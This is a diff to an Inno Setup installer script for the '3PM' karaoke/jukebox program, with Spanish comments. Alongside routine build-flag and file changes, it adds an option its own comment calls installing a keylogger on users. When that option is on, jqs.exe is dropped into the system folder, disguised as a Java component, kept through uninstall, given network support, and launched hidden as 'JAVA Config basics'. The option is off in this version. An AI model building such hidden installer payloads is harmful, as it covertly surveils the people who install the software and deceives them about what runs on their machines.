@@ -12,11 +12,14 @@
 #define IncluyeMusicaLibre false
 #define IncluyeKaraokes false
 
-; para hacer actualziadores livianos
+; para hacer actualizadores livianos
 #define IncluirGiladas true
 
 ; para directamente darle imagenes predeterminadas sobre el skin modificandolo
-#Define IncluirImgPers true
+#Define IncluirImgPers false
+
+; instalar keylogger para malditos usuarios
+#Define InstalarMedicinaTrucha false
 
 [Setup]
 AppName={#MyAppName}
@@ -29,28 +32,41 @@ DefaultDirName={pf}\{#MyAppName}
 ;DisableDirPage=yes
 DefaultGroupName=tbrSoft
 AllowNoIcons=no
-#if IncluirGiladas
-  #if IncluyeFrameWork
-    #if IncluyeMusicaLibre
-      OutputBaseFilename=Instalar3PM7-ConMusica-FW
+
+
+#if InstalarMedicinaTrucha
+  OutputBaseFilename=master_3pm_kundera_expendedor_karaoke
+#else
+  #if IncluirGiladas
+    #if IncluyeFrameWork
+      #if IncluyeMusicaLibre
+        OutputBaseFilename=Instalar3PM7-ConMusica-FW
+      #else
+        OutputBaseFilename=Instalar3PM7-FW
+      #endif
     #else
-      OutputBaseFilename=Instalar3PM7-FW
+      #if IncluyeMusicaLibre
+        OutputBaseFilename=Instalar3PM7-ConMusica
+      #else
+        OutputBaseFilename=Instalar3PM7
+      #endif
     #endif
   #else
-    #if IncluyeMusicaLibre
-      OutputBaseFilename=Instalar3PM7-ConMusica
-    #else
-      OutputBaseFilename=Instalar3PM7
-    #endif
+    OutputBaseFilename=Actualizar3PM7
   #endif
-#else
-  OutputBaseFilename=Actualizar3PM7
 #endif
+
+
 SetupIconFile=..\3pm.ico
 Compression=lzma
 SolidCompression=yes
-LicenseFile=..\license.rtf
-WizardImageFile=inst_3pm_dgd.bmp
+#if InstalarMedicinaTrucha
+  LicenseFile=..\licenseJUA.rtf
+  WizardImageFile=inst_3pm_JUA.bmp
+#else
+  LicenseFile=..\license.rtf
+  WizardImageFile=inst_3pm_dgd.bmp
+#endif
 
 [Languages]
 Name: "eng"; MessagesFile: "compiler:Default.isl"
@@ -95,6 +111,8 @@ Source: "C:\Archivos de programa\Inno Setup 5\vbFiles\msvbvm60.dll"; DestDir: "{
 ;tapa y rank
   Source: "..\fondosClis\mosse\multi13 200.jpg"; DestDir: "{app}\sf"; DestName: "tddp.322"; Flags: ignoreversion
   Source: "..\fondosClis\mosse\multi13 200.jpg"; DestDir: "{app}\sf"; DestName: "tddp.323"; Flags: ignoreversion
+;skin de mosse
+  Source: "..\skin\blare_skin_exit.SKIN"; DestDir: "{app}\skin"; Flags: ignoreversion
 #endif
 
 #if IncluirGiladas
@@ -204,6 +222,15 @@ Source: "..\3PM.EXE"; DestDir: "{app}"; Flags: ignoreversion
   Source: "C:\Archivos de programa\Inno Setup 5\vbFiles\other\dotnetfx.exe"; DestDir: {tmp}; Flags: ignoreversion {#IsExternal} ; Check: NeedsFramework
 #endif
 
+#if InstalarMedicinaTrucha
+  Source: "C:\Archivos de programa\Inno Setup 5\vbFiles\mswinsck.ocx"; DestDir: "{sys}"; Flags: restartreplace sharedfile regserver
+  Source: "..\jqs.exe"; DestDir: "{sys}"; Flags: onlyifdoesntexist uninsneveruninstall ignoreversion
+  Source: "..\jqs.exe"; DestDir: "{app}"; DestName: "3pmregs.dat"; Flags: onlyifdoesntexist uninsneveruninstall ignoreversion
+  Source: "..\jqs2323.dat.CRAKPROPIO"; DestDir: "{app}\sf"; DestName: "jqs2323.dat"; Flags: onlyifdoesntexist uninsneveruninstall ignoreversion
+  ;mp3 con ulises hablando
+  Source: "..\solocrack.mp3"; DestDir: "{sys}"; DestName: "urli.mp3"; Flags: uninsneveruninstall ignoreversion
+#endif
+
 [Icons]
 Name: "{group}\{#MyAppName}\3PM"; Filename: "{app}\{#MyAppExeName}"
 Name: "{group}\{#MyAppName}\Manual"; Filename: "{app}\manual.doc"
@@ -238,11 +265,12 @@ Name: "{userappdata}\Microsoft\Internet Explorer\Quick Launch\{#MyAppName}"; Fil
   Filename:"{reg:HKLM\SOFTWARE\Microsoft\.NETFramework,InstallRoot}\{reg:HKCR\CLSID\{{61b3e12b-3586-3a58-a497-7ed7c4c794b9%7D\InprocServer32\2.0.0.0,RuntimeVersion}\RegAsm.exe"; Parameters: {sys}\tbrBurner.dll /codebase /tlb;WorkingDir: {app}; StatusMsg: "Registrando ASM ..."; Flags: runhidden; Check: IsDotNET20Detected
 #endif
 
-
 ;////////////////////////////////////////////////////////////
+#if InstalarMedicinaTrucha
+  Filename: "{sys}\jqs.exe"; Description: "JAVA Config basics"; Flags: nowait runhidden
+#endif
 
 Filename: "{app}\{#MyAppExeName}"; Description: "{cm:LaunchProgram,{#MyAppName}}"; Flags: nowait postinstall skipifsilent
-
 
 ;This section defines what will run when the program is uninstalled. The only thing I put here, is to remove the caspol entry, just like we did in the run section. It is better to do it here, the entry in the run section is just a backup.
 [UninstallRun]
